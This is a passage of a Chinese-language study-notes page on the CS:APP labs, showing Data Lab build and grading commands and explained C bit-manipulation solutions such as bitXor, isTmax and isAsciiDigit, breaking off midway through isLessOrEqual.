class=md-nav__item> <a href=#eval class=md-nav__link> <span class=md-ellipsis> eval </span> </a> </li> <li class=md-nav__item> <a href=#builtin_cmd class=md-nav__link> <span class=md-ellipsis> builtin_cmd </span> </a> </li> <li class=md-nav__item> <a href=#do_bgfg class=md-nav__link> <span class=md-ellipsis> do_bgfg </span> </a> </li> <li class=md-nav__item> <a href=#waitfg class=md-nav__link> <span class=md-ellipsis> waitfg </span> </a> </li> <li class=md-nav__item> <a href=#sigchld_handlersigint_handlersigtstp_handler class=md-nav__link> <span class=md-ellipsis> 信号处理函数实现 sigchld_handler/sigint_handler/sigtstp_handler </span> </a> </li> <li class=md-nav__item> <a href=#tsh class=md-nav__link> <span class=md-ellipsis> tsh 测试 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#malloc-lab class=md-nav__link> <span class=md-ellipsis> Malloc Lab </span> </a> <nav class=md-nav aria-label="Malloc Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_14 class=md-nav__link> <span class=md-ellipsis> 实验概览 </span> </a> </li> <li class=md-nav__item> <a href=#_15 class=md-nav__link> <span class=md-ellipsis> 实现思路 </span> </a> </li> <li class=md-nav__item> <a href=#implicit-free-list class=md-nav__link> <span class=md-ellipsis> Implicit Free List 实现 </span> </a> <nav class=md-nav aria-label="Implicit Free List 实现"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_16 class=md-nav__link> <span class=md-ellipsis> 空闲块组织 </span> </a> </li> <li class=md-nav__item> <a href=#_17 class=md-nav__link> <span class=md-ellipsis> 合并与分割 </span> </a> </li> <li class=md-nav__item> <a href=#_18 class=md-nav__link> <span class=md-ellipsis> 放置策略 </span> </a> </li> <li class=md-nav__item> <a href=#_19 class=md-nav__link> <span class=md-ellipsis> 分配块 </span> </a> </li> <li class=md-nav__item> <a href=#_20 class=md-nav__link> <span class=md-ellipsis> 测试结果及分数 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#segregated-free-lists-segregated-fit class=md-nav__link> <span class=md-ellipsis> Segregated Free Lists实现 (Segregated Fit) </span> </a> <nav class=md-nav aria-label="Segregated Free Lists实现 (Segregated Fit)"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_21 class=md-nav__link> <span class=md-ellipsis> 结构设置 </span> </a> </li> <li class=md-nav__item> <a href=#_22 class=md-nav__link> <span class=md-ellipsis> 大小类设置 </span> </a> </li> <li class=md-nav__item> <a href=#_23 class=md-nav__link> <span class=md-ellipsis> 结构建立 </span> </a> </li> <li class=md-nav__item> <a href=#_24 class=md-nav__link> <span class=md-ellipsis> 维护链表 </span> </a> </li> <li class=md-nav__item> <a href=#_25 class=md-nav__link> <span class=md-ellipsis> 合并与分割 </span> </a> </li> <li class=md-nav__item> <a href=#_26 class=md-nav__link> <span class=md-ellipsis> 分配块 </span> </a> </li> <li class=md-nav__item> <a href=#_27 class=md-nav__link> <span class=md-ellipsis> 测试结果及分数 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#proxy-lab class=md-nav__link> <span class=md-ellipsis> Proxy Lab </span> </a> <nav class=md-nav aria-label="Proxy Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_28 class=md-nav__link> <span class=md-ellipsis> 实验概览 </span> </a> </li> <li class=md-nav__item> <a href=#tiny-web class=md-nav__link> <span class=md-ellipsis> TINY Web 服务器详解 </span> </a> <nav class=md-nav aria-label="TINY Web 服务器详解"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#http class=md-nav__link> <span class=md-ellipsis> 解析 HTTP 请求 </span> </a> </li> <li class=md-nav__item> <a href=#_29 class=md-nav__link> <span class=md-ellipsis> 提供静态内容 </span> </a> </li> <li class=md-nav__item> <a href=#_30 class=md-nav__link> <span class=md-ellipsis> 提供动态内容 </span> </a> </li> <li class=md-nav__item> <a href=#_31 class=md-nav__link> <span class=md-ellipsis> 主函数 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#part-1-implementing-a-sequential-web-proxy class=md-nav__link> <span class=md-ellipsis> Part 1: Implementing a sequential web proxy </span> </a> <nav class=md-nav aria-label="Part 1: Implementing a sequential web proxy"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_32 class=md-nav__link> <span class=md-ellipsis> 等待客户端连接 </span> </a> </li> <li class=md-nav__item> <a href=#_33 class=md-nav__link> <span class=md-ellipsis> 转发与回复 </span> </a> </li> <li class=md-nav__item> <a href=#header class=md-nav__link> <span class=md-ellipsis> 构建header </span> </a> </li> <li class=md-nav__item> <a href=#uri class=md-nav__link> <span class=md-ellipsis> 解析uri </span> </a> </li> <li class=md-nav__item> <a href=#_34 class=md-nav__link> <span class=md-ellipsis> 测试与结果 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#part-2-dealing-with-multiple-concurrent-requests class=md-nav__link> <span class=md-ellipsis> Part 2: Dealing with multiple concurrent requests </span> </a> <nav class=md-nav aria-label="Part 2: Dealing with multiple concurrent requests"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#- class=md-nav__link> <span class=md-ellipsis> 生产者-消费者模型 </span> </a> </li> <li class=md-nav__item> <a href=#proxy class=md-nav__link> <span class=md-ellipsis> 基于预线程化的 Proxy </span> </a> </li> <li class=md-nav__item> <a href=#_35 class=md-nav__link> <span class=md-ellipsis> 测试与结果 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#part-3-caching-web-objects class=md-nav__link> <span class=md-ellipsis> Part 3: Caching web objects </span> </a> <nav class=md-nav aria-label="Part 3: Caching web objects"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#-_1 class=md-nav__link> <span class=md-ellipsis> 读者-写者模型 </span> </a> </li> <li class=md-nav__item> <a href=#cache_1 class=md-nav__link> <span class=md-ellipsis> Cache 结构 </span> </a> </li> <li class=md-nav__item> <a href=#_36 class=md-nav__link> <span class=md-ellipsis> 代码 </span> </a> </li> <li class=md-nav__item> <a href=#_37 class=md-nav__link> <span class=md-ellipsis> 测试与结果 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#chrome class=md-nav__link> <span class=md-ellipsis> Chrome 实战测试 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <div><h1 id=lab>Lab<a class=headerlink href=#lab title="Permanent link">¶</a></h1> <h2 id=_1>参考资料<a class=headerlink href=#_1 title="Permanent link">¶</a></h2> <ul> <li><a href=https://csapp.cs.cmu.edu/3e/labs.html>lab 代码下载</a>, <a href=https://github.com/lingyu11/CSAPP-Lab>我的lab repo</a></li> <li><a href=https://github.com/zhuozhiyongde/Introduction-to-Computer-System-2023Fall-PKU>PKU ICS lab参考</a>, <a href=https://github.com/lingyu11/Lab-CSAPP#>我的PKU lab repo</a></li> <li><a href=https://arthals.ink/blog/data-lab>arthals lab blog</a></li> <li><a href=https://dog-du.github.io/posts/27869.html>dog-du lab blog</a></li> <li>👍<a href=https://github.com/kcxain/CSAPP-Lab>kcxain lab blog</a>, <a href=https://zhuanlan.zhihu.com/c_1480603406519238656>知乎合集</a></li> </ul> <h2 id=data-lab>Data Lab<a class=headerlink href=#data-lab title="Permanent link">¶</a></h2> <ol> <li> <p>开始</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-0-1> 1</a></span>
<span class=normal><a href=#__codelineno-0-2> 2</a></span>
<span class=normal><a href=#__codelineno-0-3> 3</a></span>
<span class=normal><a href=#__codelineno-0-4> 4</a></span>
<span class=normal><a href=#__codelineno-0-5> 5</a></span>
<span class=normal><a href=#__codelineno-0-6> 6</a></span>
<span class=normal><a href=#__codelineno-0-7> 7</a></span>
<span class=normal><a href=#__codelineno-0-8> 8</a></span>
<span class=normal><a href=#__codelineno-0-9> 9</a></span>
<span class=normal><a href=#__codelineno-0-10>10</a></span>
<span class=normal><a href=#__codelineno-0-11>11</a></span>
<span class=normal><a href=#__codelineno-0-12>12</a></span>
<span class=normal><a href=#__codelineno-0-13>13</a></span>
<span class=normal><a href=#__codelineno-0-14>14</a></span>
<span class=normal><a href=#__codelineno-0-15>15</a></span>
<span class=normal><a href=#__codelineno-0-16>16</a></span>
<span class=normal><a href=#__codelineno-0-17>17</a></span>
<span class=normal><a href=#__codelineno-0-18>18</a></span>
<span class=normal><a href=#__codelineno-0-19>19</a></span>
<span class=normal><a href=#__codelineno-0-20>20</a></span>
<span class=normal><a href=#__codelineno-0-21>21</a></span>
<span class=normal><a href=#__codelineno-0-22>22</a></span>
<span class=normal><a href=#__codelineno-0-23>23</a></span>
<span class=normal><a href=#__codelineno-0-24>24</a></span>
<span class=normal><a href=#__codelineno-0-25>25</a></span>
<span class=normal><a href=#__codelineno-0-26>26</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-0-1><a id=__codelineno-0-1 name=__codelineno-0-1></a><span class=c1># 解压</span>
</span><span id=__span-0-2><a id=__codelineno-0-2 name=__codelineno-0-2></a>tar<span class=w> </span>-xvf<span class=w> </span>datalab-handout.tar
</span><span id=__span-0-3><a id=__codelineno-0-3 name=__codelineno-0-3></a><span class=c1># 进入工作目录</span>
</span><span id=__span-0-4><a id=__codelineno-0-4 name=__codelineno-0-4></a><span class=nb>cd</span><span class=w> </span>datalab-handout
</span><span id=__span-0-5><a id=__codelineno-0-5 name=__codelineno-0-5></a><span class=c1># 编译</span>
</span><span id=__span-0-6><a id=__codelineno-0-6 name=__codelineno-0-6></a>make
</span><span id=__span-0-7><a id=__codelineno-0-7 name=__codelineno-0-7></a>
</span><span id=__span-0-8><a id=__codelineno-0-8 name=__codelineno-0-8></a><span class=c1># 编译并运行</span>
</span><span id=__span-0-9><a id=__codelineno-0-9 name=__codelineno-0-9></a>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./btest
</span><span id=__span-0-10><a id=__codelineno-0-10 name=__codelineno-0-10></a><span class=c1># 对某个函数进行单元测试</span>
</span><span id=__span-0-11><a id=__codelineno-0-11 name=__codelineno-0-11></a>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./btest<span class=w> </span>-f<span class=w> </span>bitXor
</span><span id=__span-0-12><a id=__codelineno-0-12 name=__codelineno-0-12></a><span class=c1># 对某个函数进行单元测试，且指定测试用例，以 -1 指定第一个参数，依次类推</span>
</span><span id=__span-0-13><a id=__codelineno-0-13 name=__codelineno-0-13></a>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./btest<span class=w> </span>-f<span class=w> </span>bitXor<span class=w> </span>-1<span class=w> </span><span class=m>7</span><span class=w> </span>-2<span class=w> </span>0xf
</span><span id=__span-0-14><a id=__codelineno-0-14 name=__codelineno-0-14></a>
</span><span id=__span-0-15><a id=__codelineno-0-15 name=__codelineno-0-15></a><span class=c1># 检查是否符合编码规范</span>
</span><span id=__span-0-16><a id=__codelineno-0-16 name=__codelineno-0-16></a>./dlc<span class=w> </span>bits.c
</span><span id=__span-0-17><a id=__codelineno-0-17 name=__codelineno-0-17></a>
</span><span id=__span-0-18><a id=__codelineno-0-18 name=__codelineno-0-18></a><span class=c1># 对某个函数进行单元测试</span>
</span><span id=__span-0-19><a id=__codelineno-0-19 name=__codelineno-0-19></a>./bddcheck/check.pl<span class=w> </span>-f<span class=w> </span>bitXnor
</span><span id=__span-0-20><a id=__codelineno-0-20 name=__codelineno-0-20></a><span class=c1># 检查所有函数</span>
</span><span id=__span-0-21><a id=__codelineno-0-21 name=__codelineno-0-21></a>./bddcheck/check.pl
</span><span id=__span-0-22><a id=__codelineno-0-22 name=__codelineno-0-22></a><span class=c1># 检查所有函数，且输出总结信息</span>
</span><span id=__span-0-23><a id=__codelineno-0-23 name=__codelineno-0-23></a>./bddcheck/check.pl<span class=w> </span>-g
</span><span id=__span-0-24><a id=__codelineno-0-24 name=__codelineno-0-24></a>
</span><span id=__span-0-25><a id=__codelineno-0-25 name=__codelineno-0-25></a><span class=c1># 最后的评分：运行 driver.pl 脚本，检查所有函数的实现是否正确</span>
</span><span id=__span-0-26><a id=__codelineno-0-26 name=__codelineno-0-26></a>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./driver.pl
</span></code></pre></div></td></tr></table></div> <p><a href=https://zhuanlan.zhihu.com/p/614126795>题目解析参考</a></p> </li> <li> <h3 id=bitxor><code>bitXor</code><a class=headerlink href=#bitxor title="Permanent link">¶</a></h3> <p>异或操作：(~x &amp; y) | (x &amp; ~y)，即要么x为0且y为1，要么x为1且y为0，而题目要求只能使用 ~ 和 &amp; 操作符，由布尔代数中的德摩根定律可知，a | b = ~ (~a &amp; ~b)，所以可得：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-1-1>1</a></span>
<span class=normal><a href=#__codelineno-1-2>2</a></span>
<span class=normal><a href=#__codelineno-1-3>3</a></span>
<span class=normal><a href=#__codelineno-1-4>4</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-1-1><a id=__codelineno-1-1 name=__codelineno-1-1></a><span class=kt>int</span><span class=w> </span><span class=nf>bitXor</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>x</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>y</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-1-2><a id=__codelineno-1-2 name=__codelineno-1-2></a><span class=p>{</span>
</span><span id=__span-1-3><a id=__codelineno-1-3 name=__codelineno-1-3></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=o>~</span><span class=p>(</span><span class=o>~</span><span class=p>(</span><span class=o>~</span><span class=n>x</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>y</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=o>~</span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=o>~</span><span class=n>y</span><span class=p>));</span>
</span><span id=__span-1-4><a id=__codelineno-1-4 name=__codelineno-1-4></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=tmin><code>tmin</code><a class=headerlink href=#tmin title="Permanent link">¶</a></h3> <p>最小的负数：1 &lt;&lt; 31，即 0x80000000</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-2-1>1</a></span>
<span class=normal><a href=#__codelineno-2-2>2</a></span>
<span class=normal><a href=#__codelineno-2-3>3</a></span>
<span class=normal><a href=#__codelineno-2-4>4</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-2-1><a id=__codelineno-2-1 name=__codelineno-2-1></a><span class=kt>int</span><span class=w> </span><span class=nf>tmin</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-2-2><a id=__codelineno-2-2 name=__codelineno-2-2></a><span class=p>{</span>
</span><span id=__span-2-3><a id=__codelineno-2-3 name=__codelineno-2-3></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>31</span><span class=p>;</span>
</span><span id=__span-2-4><a id=__codelineno-2-4 name=__codelineno-2-4></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=istmax><code>isTmax</code><a class=headerlink href=#istmax title="Permanent link">¶</a></h3> <p>判断是否为最大的整数，即 0x7fffffff：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-3-1>1</a></span>
<span class=normal><a href=#__codelineno-3-2>2</a></span>
<span class=normal><a href=#__codelineno-3-3>3</a></span>
<span class=normal><a href=#__codelineno-3-4>4</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-3-1><a id=__codelineno-3-1 name=__codelineno-3-1></a><span class=kt>int</span><span class=w> </span><span class=nf>isTmax</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-3-2><a id=__codelineno-3-2 name=__codelineno-3-2></a><span class=p>{</span>
</span><span id=__span-3-3><a id=__codelineno-3-3 name=__codelineno-3-3></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=p>((</span><span class=o>!</span><span class=p>((</span><span class=n>x</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>x</span><span class=p>)))</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>!!</span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>)));</span>
</span><span id=__span-3-4><a id=__codelineno-3-4 name=__codelineno-3-4></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>若 x 是 0x7fffffff，那么 x + 1 就是最小的负数，即 0x80000000，而 ~x 也是 0x80000000，即<span style=color:blue;>对 Tmax 进行 +1 或取反操作，都会得到 Tmin</span>，因此 <code>!((x + 1) ^ (~x))</code>可以判断它是否是 Tmax。然而-1 即 0xffffffff也满足这个性质，因此需要排除它，通过 <code>!!(x + 1)</code> 来排除，两个!是为了用逻辑非来规整到0或者1。</p> </li> <li> <h3 id=alloddbits><code>allOddBits</code><a class=headerlink href=#alloddbits title="Permanent link">¶</a></h3> <p>判断是否所有奇数位都是1：最小满足条件就是 0xAAAAAAAA，然后判断 x &amp; a == a 即可。注意文档要求常数不能超过8bits，所以不能直接用 0xAAAAAAAA 来判断，需要通过位操作来构造。</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-4-1>1</a></span>
<span class=normal><a href=#__codelineno-4-2>2</a></span>
<span class=normal><a href=#__codelineno-4-3>3</a></span>
<span class=normal><a href=#__codelineno-4-4>4</a></span>
<span class=normal><a href=#__codelineno-4-5>5</a></span>
<span class=normal><a href=#__codelineno-4-6>6</a></span>
<span class=normal><a href=#__codelineno-4-7>7</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-4-1><a id=__codelineno-4-1 name=__codelineno-4-1></a><span class=kt>int</span><span class=w> </span><span class=nf>allOddBits</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-4-2><a id=__codelineno-4-2 name=__codelineno-4-2></a><span class=p>{</span>
</span><span id=__span-4-3><a id=__codelineno-4-3 name=__codelineno-4-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0xAA</span><span class=p>;</span>
</span><span id=__span-4-4><a id=__codelineno-4-4 name=__codelineno-4-4></a><span class=w>    </span><span class=n>a</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=n>a</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>8</span><span class=p>);</span>
</span><span id=__span-4-5><a id=__codelineno-4-5 name=__codelineno-4-5></a><span class=w>    </span><span class=n>a</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=n>a</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>16</span><span class=p>);</span>
</span><span id=__span-4-6><a id=__codelineno-4-6 name=__codelineno-4-6></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=o>!</span><span class=p>((</span><span class=n>a</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>a</span><span class=p>);</span>
</span><span id=__span-4-7><a id=__codelineno-4-7 name=__codelineno-4-7></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=negate><code>negate</code><a class=headerlink href=#negate title="Permanent link">¶</a></h3> <p>取反操作：~x + 1，即对 x 取反后加1，得到 -x。</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-5-1>1</a></span>
<span class=normal><a href=#__codelineno-5-2>2</a></span>
<span class=normal><a href=#__codelineno-5-3>3</a></span>
<span class=normal><a href=#__codelineno-5-4>4</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-5-1><a id=__codelineno-5-1 name=__codelineno-5-1></a><span class=kt>int</span><span class=w> </span><span class=nf>negate</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>x</span><span class=p>)</span>
</span><span id=__span-5-2><a id=__codelineno-5-2 name=__codelineno-5-2></a><span class=p>{</span>
</span><span id=__span-5-3><a id=__codelineno-5-3 name=__codelineno-5-3></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=o>~</span><span class=n>x</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-5-4><a id=__codelineno-5-4 name=__codelineno-5-4></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=isasciidigit><code>isAsciiDigit</code><a class=headerlink href=#isasciidigit title="Permanent link">¶</a></h3> <p>判断是否为0-9的ASCII码 (return 1 if 0x30 &lt;= x &lt;= 0x39)：观察到这个范围的数的高4位都是0x3，低4位都是0-9的数，所以可以先判断高4位是否为0x3，然后判断低4位是否为0-9的数。</p> <ul> <li>先判断高4位是否为0x3，即 (x &gt;&gt; 4) ^ 0x3 是否为0</li> <li>再判断低4位是否为0-9的数，0x9 + (~y + 1) 表示 0x9 - y，若其结果为正数（则表示 y 是0-9的数），那么最高位是0，右移31位得到最高位</li> </ul> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-6-1>1</a></span>
<span class=normal><a href=#__codelineno-6-2>2</a></span>
<span class=normal><a href=#__codelineno-6-3>3</a></span>
<span class=normal><a href=#__codelineno-6-4>4</a></span>
<span class=normal><a href=#__codelineno-6-5>5</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-6-1><a id=__codelineno-6-1 name=__codelineno-6-1></a><span class=kt>int</span><span class=w> </span><span class=nf>isAsciiDigit</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-6-2><a id=__codelineno-6-2 name=__codelineno-6-2></a><span class=p>{</span>
</span><span id=__span-6-3><a id=__codelineno-6-3 name=__codelineno-6-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>y</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xf</span><span class=p>;</span><span class=w> </span><span class=c1>// 把最低4位先拿出来</span>
</span><span id=__span-6-4><a id=__codelineno-6-4 name=__codelineno-6-4></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=o>!</span><span class=p>((</span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>4</span><span class=p>)</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=mh>0x3</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=o>!</span><span class=p>((</span><span class=mh>0x9</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>31</span><span class=p>);</span>
</span><span id=__span-6-5><a id=__codelineno-6-5 name=__codelineno-6-5></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=conditional><code>conditional</code><a class=headerlink href=#conditional title="Permanent link">¶</a></h3> <p>条件操作：x ? y : z 。</p> <ul> <li>设置一个变量<code>notZero</code>来判断x是否不为0，如果不为0，则该变量为1；否则为0。</li> <li>设置一个变量<code>flag</code>，当<code>notZero</code>为1时，该变量为<code>0xffffffff</code>；否则为<code>0x00000000</code>。</li> </ul> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-7-1>1</a></span>
<span class=normal><a href=#__codelineno-7-2>2</a></span>
<span class=normal><a href=#__codelineno-7-3>3</a></span>
<span class=normal><a href=#__codelineno-7-4>4</a></span>
<span class=normal><a href=#__codelineno-7-5>5</a></span>
<span class=normal><a href=#__codelineno-7-6>6</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-7-1><a id=__codelineno-7-1 name=__codelineno-7-1></a><span class=kt>int</span><span class=w> </span><span class=nf>conditional</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>x</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>y</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>z</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-7-2><a id=__codelineno-7-2 name=__codelineno-7-2></a><span class=p>{</span>
</span><span id=__span-7-3><a id=__codelineno-7-3 name=__codelineno-7-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>notZero</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>!!</span><span class=n>x</span><span class=p>;</span>
</span><span id=__span-7-4><a id=__codelineno-7-4 name=__codelineno-7-4></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>flag</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>~</span><span class=n>notZero</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-7-5><a id=__codelineno-7-5 name=__codelineno-7-5></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>flag</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>y</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=n>flag</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>z</span><span class=p>);</span>
</span><span id=__span-7-6><a id=__codelineno-7-6 name=__codelineno-7-6></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=islessorequal><code>isLessOrEqual</code><a class=headerlink href=#islessorequal title="Permanent link">¶</a></h3> <p>判断是否小于等于：x &lt;= y 。</p> <ul> <li><code>!(x ^ y)</code>：检查x和y是否相等，如果相等则直接返回1</li> <li><code>(flag &amp; flagx) | (~flag &amp; less)</code>：根据符号是否相同进行不同的判断：<ul> <li>当符号不同时（flag为全1）：检查x是否为负数（flagx为1），如果是则x &lt; y</li> <li>当符号相同时（flag为全0）：使用前面计算的less值来判断x是否小于y</li> </ul> </li> </ul> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-8-1>1</a></span>
<span class=normal><a href=#__codelineno-8-2>2</a></span>
<span class=normal><a href=#__codelineno-8-3>3</a></span>
<span class=normal><a href=#__codelineno-8-4>4</a></span>
<span class=normal><a href=#__codelineno-8-5>5</a></span>
<span class=normal><a href=#__codelineno-8-6>6</a></span>
<span class=normal><a href=#__codelineno-8-7>7</a></span>
<span class=normal><a href=#__codelineno-8-8>8</a></span>
<span class=normal><a href=#__codelineno-8-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-8-1><a id=__codelineno-8-1 name=__codelineno-8-1></a><span class=kt>int</span><span class=w> </span><span class=nf>isLessOrEqual</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>x</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>y</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-8-2><a id=__codelineno-8-2 name=__codelineno-8-2></a><span class=p>{</span>
</span><span id=__span-8-3><a id=__codelineno-8-3 name=__codelineno-8-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>flagx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>31</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mi>1</span><span class=p>);</span>
</span><span id=__span-8-4><a id=__codelineno-8-4 name=__codelineno-8-4></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>flagy</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>y</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=mi>31</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mi>1</span><span class=p>);</span>
</span><span id=__span-8-5><a id=__codelineno-8-5 name=__codelineno-8-5></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>notZero</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>!!</span><span class=p>(</span><span class=n>flagx</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>flagy</span><span class=p>);</span><span class=w>       </span><span class=c1>// x,y符号不同则notZero为1，相同则notZero为0</span>
